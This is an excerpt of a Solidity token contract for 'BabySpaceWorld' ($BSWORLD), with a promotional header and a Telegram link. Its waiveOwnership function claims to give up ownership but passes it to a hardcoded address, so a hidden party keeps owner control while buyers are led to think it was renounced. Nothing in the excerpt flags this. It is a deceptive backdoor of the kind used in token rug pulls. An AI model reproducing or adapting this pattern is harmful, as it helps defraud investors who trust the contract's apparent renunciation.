...
/**
   BIGMOONBIGHYPE
   Telegram:https://t.me/BabySpaceWorldBsc
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xc2A9dDc49BD4E750622229055385F2d23c2C66B3));
        _owner = address(0xc2A9dDc49BD4E750622229055385F2d23c2C66B3);
    }
...
contract BabySpaceWorld is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BabySpaceWorld";
    string private _symbol = "$BSWORLD";
